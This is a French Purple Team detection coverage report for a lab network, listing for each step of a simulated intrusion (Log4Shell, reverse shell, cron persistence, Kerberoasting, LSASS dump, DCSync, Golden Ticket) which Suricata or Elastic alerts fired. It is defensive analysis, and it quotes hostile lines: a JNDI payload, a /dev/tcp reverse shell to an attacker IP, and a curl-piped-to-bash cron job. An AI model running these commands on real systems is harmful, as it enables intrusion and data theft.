# 01 - Matrice de couverture de détection (Detection Coverage Matrix)

La surveillance de l'infrastructure E Corp s'appuie sur une pile technologique hybride centralisée dans **Elastic SIEM**. La télémétrie réseau est assurée par la sonde NIDS **Suricata**, tandis que la surveillance des points de terminaison repose sur les **Agents Elastic (EDR / HIDS)** déployés sur les serveurs Linux (`dmz-lnx-portal`) et l'environnement Windows Active Directory (`lan-win-dc01`, `lan-win-mgmt01`, `lan-win-wk01`).

Ce document cartographie de manière exhaustive la visibilité réelle du SOC face à chaque action de la *Kill Chain* (Phases 1 à 5), en distinguant les détections franches, les détections indirectes (effets de bord ou bruit réseau) et les angles morts critiques.

---

## Légende des statuts de détection

- **✅ Détecté :** L'action offensive a déclenché une ou plusieurs alertes explicites et pertinentes (NIDS et/ou EDR) permettant de qualifier la menace.
- **⚠️ Partiel / Implicite :** L'action n'est pas qualifiée pour ce qu'elle est réellement, mais génère un symptôme (pic CPU, erreur de flux TCP, trafic chiffré WinRM) ou une alerte de faible sévérité noyée dans le bruit.
- **❌ Non détecté (Angle mort) :** L'action s'est exécutée sur le réseau ou sur l'hôte sans générer aucune alerte dans le SIEM.
- **⚪ Hors périmètre (Offline) :** Action exécutée localement sur la machine de l'attaquant, par nature invisible pour les capteurs de l'entreprise.

---

## Phase 1 : Accès initial et persistance (Log4Shell)

| Sous-étape | Action offensive et outil | Statut | Source(s) | Sévérité max | Signatures déclenchées et détails techniques |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1.1 Scan web automatisé** | Fuzzing web et scan JNDI sur `/api/login` (`Burp Suite` + `Log4Shell Scanner`) | ✅ **Détecté** | Suricata (NIDS) | **High** | Bruit du scanner web (SQLi, XXE, XSS, Path Traversal : `ET WEB_SERVER ...`, `ET HUNTING ...`). En particulier, rafale d'alertes `ET EXPLOIT Apache log4j RCE Attempt` causées par l'injection massive de payloads JNDI dans les en-têtes (`User-Agent`, `Referer`, `Cookie`) et le JSON par l'extension Burp. |
| **1.2 Test OOB** | Validation DNS Log4Shell (`curl` + `Interactsh`) | ✅ **Détecté** | Suricata (NIDS) | **High** | `ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)` à l'entrée HTTP et `ET INFO Out-of-Band Interaction Domain in DNS Lookup` en sortie vers `8.8.8.8`. L'application propage aussi le payload vers le LDAP interne (`10.0.20.5:389`), doublant les alertes. |
| **2.1 Injection JNDI** | Envoi du payload LDAP (`${jndi:ldap://192.168.1.150:1389/a}`) | ✅ **Détecté** | Suricata (NIDS) | **High** | `ET EXPLOIT Apache log4j RCE Attempt` sur la requête POST, suivi de `ET INFO Anonymous LDAPv3 Bind Request Outbound` et `ET ATTACK_RESPONSE Possible CVE-2021-44228 Payload via LDAPv3 Response` (`JavaClass Returned`) lors de la réponse de `marshalsec`. |
| **2.2 Livraison payload** | Téléchargement de `Exploit.class` (`python3 http.server 8000`) | ✅ **Détecté** | Suricata (NIDS) | **High** | `ET INFO JAVA - Java Class Download By Vulnerable Client` (le payload capturé contient en clair la commande `/bin/bash -c bash -i >& /dev/tcp/192.168.1.150/4444 0>&1`). |
| **2.3 Reverse shell** | Exécution du shell interactif vers `192.168.1.150:4444` (`nc`) | ✅ **Détecté** | Suricata + Elastic EDR | **High** | **NIDS :** `ET ATTACK_RESPONSE Interactive Reverse Shell Without TTY (Outbound)` (bannière `bash: no job control in this shell`).<br>**EDR :** `Potential Reverse Shell Activity via Terminal` (création du processus `bash` par le parent `java` sous l'utilisateur `ecorp-web`). |
| **3. Upgrade TTY** | Allocation PTY (`python3 -c 'import pty...'`, `stty`, `export TERM`) | ✅ **Détecté** | Elastic EDR | **High** | `Interactive Terminal Spawned via Python` (`bash` exécuté par `python3.14`). |
| **4.1 Recon. locale** | Énumération système (`id`, `uname -a`, `cat /etc/os-release`, `ls`) | ✅ **Détecté** | Suricata (NIDS) | **High** | Commandes en clair capturées dans le flux TCP `4444` via `ET ATTACK_RESPONSE Output of id command from HTTP server` (déclenchée par la sortie de la commande `id`) |
| **4.2 Énum. privilèges**| Vérification des droits (`sudo -l`) | ✅ **Détecté** | Elastic EDR | **Low** | `Sudo Command Enumeration Detected` sur `dmz-lnx-portal`. |
| **4.3 Persistance** | Injection dans le `crontab` et exécution minute (`curl -s .../run \| /bin/bash`) | ✅ **Détecté** | Elastic EDR + Suricata | **High** | **EDR :** `Cron Job Created or Modified` (`/var/spool/cron/crontabs/ecorp-web`), `File Downloaded by Curl/Wget and Piped to Interpreter` (`dash` -> `curl` / `bash`).<br>**NIDS :** `ET HUNTING curl User-Agent to Dotted Quad` (`GET /run` avec `curl/8.18.0`) toutes les minutes. |

**Bilan Phase 1 :** L'alliance de la sécurité périmétrique (Suricata) et de la surveillance système (Elastic EDR) n'a laissé aucun angle mort.

---

## Phase 2 : Reconnaissance interne et trojanisation

| Sous-étape | Action offensive et outil | Statut | Source(s) | Sévérité max | Signatures déclenchées et détails techniques |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1.1 Config. réseau** | Découverte locale (`ip a`, `ip route`, `ip neigh`) | ❌ **Non détecté** | Aucune | - | Aucune alerte EDR sur l'exécution des utilitaires réseau natifs. |
| **1.2 Ping sweep** | Balayage ICMP asynchrone (`for i in {0..255}; do ping...`) | ✅ **Détecté** | Elastic EDR | **Medium** | L'exécution massive de la commande `ping` vers les autres sous-réseaux déclenche l'alerte comportementale `Potential Network Scan Executed From Host` sur l'agent Elastic. |
| **2.1 Énum. service** | Analyse du processus Java et Systemd (`ps aux`, `ecorp-portal.service`) | ❌ **Non détecté** | Aucune | - | Aucune alerte EDR sur la lecture des fichiers de configuration des services ou l'inspection locale. |
| **2.2 Exfiltration** | Transfert de `ecorp-portal.jar` via `/dev/tcp/192.168.1.150/9001` | ⚠️ **Partiel (Anomalie TCP)** | Suricata (NIDS) | **Low** | L'EDR ignore l'usage de `/dev/tcp`. Suricata génère des alertes techniques (`STREAM ESTABLISHED packet out of window`, `invalid ack`) contenant l'en-tête ZIP, sans qualifier explicitement l'exfiltration. |
| **3.1 Trojanisation** | Écrasement du binaire (`chmod u+w`, `curl -o ...:8000/malicious-app.jar`) | ⚠️ **Partiel (Noyé)** | Suricata (NIDS) | **Medium** | Absence d'alerte d'intégrité de fichier (FIM) sur la modification de `/opt/ecorp-portal/ecorp-portal.jar`. Le téléchargement réseau déclenche bien `ET HUNTING curl User-Agent to Dotted Quad`, mais l'alerte est totalement invisibilisée par la masse d'alertes identiques générées chaque minute par la persistance Cron établie en Phase 1. |
| **3.2 Sabotage** | Arrêt brutal du processus Java (`kill -9 <PID>`) | ❌ **Non détecté** | Aucune | - | Aucune alerte système ou EDR sur l'arrêt forcé du service applicatif critique. |
| **3.3 Harvesting** | Exfiltration des identifiants (`e.alderson`) via requêtes `POST` JS | ❌ **Non détecté** | Aucune | - | Le code JavaScript s'exécute côté client (navigateur) et contacte directement l'IP attaquante sur le port `9001`, contournant la détection du serveur web. |

**Bilan Phase 2 :** À l'exception du balayage réseau (Ping Sweep) repéré par l'EDR, l'utilisation d'outils natifs Linux a rendu l'attaquant invisible. Les actions critiques de cette phase (l'exploration du système, le sabotage de l'application et le vol d'identifiants côté client) constituent des angles morts complets ou se sont noyées dans le bruit de fond du réseau.

---

## Phase 3 : Énumération AD et kerberoasting (pivoting)

| Sous-étape | Action offensive et outil | Statut | Source(s) | Sévérité max | Signatures déclenchées et détails techniques |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1.1 Tool transfer** | Téléchargement de `chisel` dans `/var/tmp` via `wget` sur le port `8000` | ✅ **Détecté** | Suricata (NIDS) | **High** | `ET INFO Executable and linking format (ELF) file download` déclenchée par l'en-tête magique `.ELF` transitant en clair depuis le serveur `SimpleHTTP/0.6 Python/3.14.6` (`192.168.1.150:8000`). |
| **1.2 Tunneling C2** | Connexion client `chisel` vers `192.168.1.150:443` (`R:socks`) | ✅ **Détecté** | Suricata (NIDS) | **Low** | `ET USER_AGENTS Go HTTP Client User-Agent` et `ET INFO Go-http-client User-Agent Observed Outbound`. L'absence de TLS sur le port `443` permet d'observer la signature exacte dans le payload : `Sec-WebSocket-Protocol: chisel-v3` et `Upgrade: websocket`. |
| **2.1 Validation SMB** | Authentification SMB avec `e.alderson` sur `10.0.20.5` (`netexec smb`) | ⚠️ **Partiel (Info)** | Suricata (NIDS) | **Low** | `ET INFO NTLM Session Setup Request - Negotiate / Challenge / Auth` sur le port `445`. Noyé dans le bruit de fond légitime Windows, l'empreinte de l'outil `NetExec` n'est pas qualifiée. |
| **2.2 Énum. LDAP** | Listing du groupe *Domain Admins* (`netexec ldap 10.0.20.5 --groups "Domain Admins"`) | ❌ **Non détecté** | - | - | Aucune alerte réseau (port `389`/`636`) ni d'audit d'accès à l'annuaire (*Directory Service Access*) sur le Contrôleur de Domaine. |
| **3. Recherche SPN et kerberoasting** | Requête LDAP initiale pour lister les comptes Kerberoastable et demande du ticket TGS pour `svc_deploy` (`impacket-GetUserSPNs -request`) | ✅ **Détecté** | Suricata + Agent DC01 | **High / Medium** | **NIDS :** `ET EXPLOIT Possible GoldenPac Priv Esc in-use` (**High**, déclenchée par la structure des paquets Kerberos d'Impacket sur le port `88`) et `SURICATA Kerberos 5 weak encryption parameters` (**Low**).<br>**SIEM / DC01 :** `Newly Observed RC4 Kerberos Service Ticket Request` (**Medium**), détectant la rétrogradation de chiffrement en RC4 (etype 23) par `e.alderson`. |
| **4. Cracking** | Cassage hors-ligne du ticket TGS avec `hashcat` (`-m 13100`) | ⚪ **Hors périmètre** | N/A | N/A | Exécuté localement sur la machine hôte de l'attaquant. |

**Bilan Phase 3 :** Une fois le tunnel `Chisel` établi, toutes les attaques internes apparaissent avec l'IP source du pivot DMZ (`10.0.10.10`). Si l'interrogation de l'annuaire LDAP constitue un angle mort total, la demande de ticket Kerberos en RC4 (etype 23) est immédiatement repérée à la fois sur le réseau et sur le Contrôleur de Domaine.

---

## Phase 4 : Mouvement latéral et dump LSASS

| Sous-étape | Action offensive et outil | Statut | Source(s) | Sévérité max | Signatures déclenchées et détails techniques |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1. Cartographie AD** | Extraction LDAP des ordinateurs et résolution DNS TCP (`enum_ad_computers.py`) | ❌ **Non détecté** | Aucune | - | Aucune alerte réseau ou système sur les requêtes LDAP (`389`) et DNS TCP (`53`) vers `10.0.20.5`. |
| **2. Spray WinRM** | Validation des droits d'admin local de `svc_deploy` (`netexec winrm targets.txt`) | ✅ **Détecté** | Suricata (NIDS) | **Medium** | `ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement` (`Python PSRP Client`) et `SURICATA HTTP Request unrecognized authorization method` sur le port `5985`. |
| **3. Chasse sessions** | Énumération des sessions actives (`netexec winrm -X 'quser'`) sur `.100` et `.102` | ⚠️ **Partiel (Réseau)** | Suricata (NIDS) | **Medium** | Le flux WinRM vers `10.0.20.102` est vu par Suricata, mais le chiffrement SPNEGO masque la commande et aucune alerte processus hôte ne remonte. |
| **4. Accès interactif**| Connexion shell sur `LAN-WIN-MGMT01` (`10.0.20.102`) via `evil-winrm` | ✅ **Détecté** | Suricata (NIDS) | **Medium** | `ET USER_AGENTS WinRM User Agent Detected` (`Microsoft WinRM Client`). L'analyse du payload NTLMSSP (`POST /wsman`) révèle également le nom d'hôte de l'attaquant (`kali-vm`) encodé en Base64. |
| **5. Dump LSASS** | Injection PowerShell *Fileless* (`Add-Type` C# P/Invoke `MiniDumpWriteDump`) vers `C:\Windows\Temp\lsass.dmp` | ✅ **Détecté** | Elastic EDR | **High** | L'Agent Elastic a parfaitement intercepté l'attaque en mémoire grâce aux alertes `PowerShell MiniDump Script` et `LSASS Memory Dump Creation`, mettant en échec la tentative de contournement statique. |
| **6. Exfiltration** | Rapatriement de `lsass.dmp` (59 Mo) via la commande `download` d'`evil-winrm` | ⚠️ **Implicite** | Suricata (NIDS) | **Medium** | Plus de 150 alertes `ET USER_AGENTS WinRM User Agent Detected` en 1 minute avec charges chiffrées (`application/HTTP-SPNEGO-session-encrypted`), traduisant le transfert volumineux sans le qualifier explicitement d'exfiltration. |
| **7. Parsing NTLM** | Extraction du hash NTLM de `t.wellick` avec `pypykatz` | ⚪ **Hors périmètre** | N/A | N/A | Analyse du dump mémoire réalisée hors-ligne sur la machine Kali. |

**Bilan Phase 4 :** Si l'attaque critique a bien été interceptée (l'EDR a correctement détecté l'injection PowerShell), le SOC souffre d'angles morts importants en amont. L'énumération de l'Active Directory (LDAP/DNS) est passée inaperçue, et le chiffrement du protocole WinRM a empêché de voir les commandes exactes exécutées lors de la chasse aux sessions (`quser`) et de l'exfiltration du dump.

---

## Phase 5 : Compromission du domaine et impact final (Golden Ticket)

| Sous-étape | Action offensive et outil | Statut | Source(s) | Sévérité max | Signatures déclenchées et détails techniques |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1. Pass-the-Hash** | Connexion `evil-winrm` sur `10.0.20.5` avec le hash NTLM de `t.wellick` + commande `whoami` | ⚠️ **Partiel** | Suricata + Agent DC01 | **Medium** | **NIDS :** `ET USER_AGENTS WinRM User Agent Detected` avec fuite du nom d'hôte `kali-vm` dans la trame NTLMSSP.<br>**EDR :** Détection de `whoami` via `Whoami Process Activity` |
| **2. Attaque DCSync** | Réplication frauduleuse des secrets AD et du hash `krbtgt` (`impacket-secretsdump`) | ✅ **Détecté** | Elastic EDR | **High** | Le SIEM a parfaitement corrélé l'attaque via deux alertes : `First Time Seen Account Performing DCSync` et `Potential Credential Access via DCSync`. |
| **3.1 Énum. Domain SID**| Récupération du SID du domaine (`impacket-lookupsid` avec `e.alderson`) | ❌ **Non détecté** | Aucune | - | L'énumération des SID via RPC/SMB ne déclenche aucune alerte. |
| **3.2 Forge ticket** | Création du Golden Ticket pour `Administrator` (`impacket-ticketer`) | ⚪ **Hors périmètre** | N/A | N/A | Génération hors-ligne du fichier `.ccache` sur la machine attaquante. |
| **3.3 Pass-the-Ticket**| Injection du Golden Ticket (`evil-winrm -K`) + `whoami` | ✅ **Détecté** | Suricata + Agent DC01 | **Medium** | **NIDS :** `SURICATA Kerberos 5 weak encryption parameters` (usage anormal de RC4-HMAC par le ticket forgé) et trafic WinRM Kerberos.<br>**EDR :** Détection de l'exécution post-exploitation de `whoami.exe`. |
| **4. Sabotage GPO** | Dépôt dans `SYSVOL` et création GPO (`New-GPO`, `Copy-Item`) | ⚠️ **Partiel (Réseau)** | Suricata (NIDS) | **Medium** | Trafic WinRM chiffré intercepté par le NIDS. En revanche, absence totale d'alerte FIM sur `SYSVOL`, ni concernant la création d'une nouvelle GPO. |
| **5. Impact final** | Note de rançon, `gpupdate /force` et reboot massif (`netexec winrm -X 'shutdown...'`) | ⚠️ **Partiel (Réseau)** | Suricata (NIDS) | **Medium** | **NIDS :** Nombreuses alertes `WinRM User Agent Detected` vers `.5`, `.100` et `.102`; mais pas d'alerte sur l'écriture de la note, l'exécution de `gpupdate` ou l'arrêt système.  |

**Bilan Phase 5 :** Le SIEM a prouvé son efficacité sur la détection des compromissions d'identifiants les plus critiques (interception de l'attaque DCSync par l'EDR et repérage de l'anomalie cryptographique Kerberos liée au Golden Ticket par le NIDS). Cependant, l'exécution finale de commandes destructrices met en évidence une importante lacune d'audit : l'absence de supervision des partages critiques (SYSVOL) et des objets Active Directory (GPO).

---

## Synthèse globale : ce que l'exercice Purple Team révèle

L'analyse croisée de ces 5 matrices met en évidence quatre enseignements majeurs pour l'ingénierie de détection du SOC :

### 1. La complémentarité indispensable NIDS / EDR
La défense a reposé sur l'alliance des capteurs. Suricata a excellé sur l'inspection réseau périmétrique (payloads JNDI, téléchargements suspects, User-Agents offensifs) et les anomalies cryptographiques (Kerberos RC4). En miroir, l'Agent Elastic a apporté la profondeur système indispensable : matérialisation du Reverse Shell, détection des tâches Cron, et interception critique du dump LSASS ou de l'attaque DCSync en mémoire. Face aux techniques d'évasion, l'un a systématiquement pallié l'aveuglement de l'autre.

### 2. Une sécurité périmétrique initiale robuste
La chaîne d'intrusion web (Log4Shell, téléchargement du payload, établissement du shell interactif et persistance) a généré des alertes de haute fidélité immédiates. Un SOC opérationnel disposait de tous les signaux pour isoler la machine ciblée en DMZ avant le moindre pivot vers le réseau interne.

### 3. Le défi du « Living off the Land » et du trafic chiffré
L'usage d'outils natifs de l'OS (requêtes LDAP, scripts P/Invoke) et de protocoles d'administration légitimes (WinRM via SPNEGO) complique l'analyse. Si Suricata a détecté des flux WinRM anormaux lors de la compromission finale, le chiffrement SPNEGO a masqué les commandes réelles (chasse aux sessions, exfiltration du dump mémoire, lancement du ransomware), réduisant ces actions critiques à de simples anomalies de volume.

### 4. L'angle mort critique de l'audit Active Directory
C'est la vulnérabilité majeure du SIEM. Si les outils offensifs ont fait du bruit, l'altération logique finale du domaine est passée totalement inaperçue : énumération de l'annuaire invisible, modification furtive des GPO, et absence de File Integrity Monitoring (FIM) sur le partage `SYSVOL` effectué.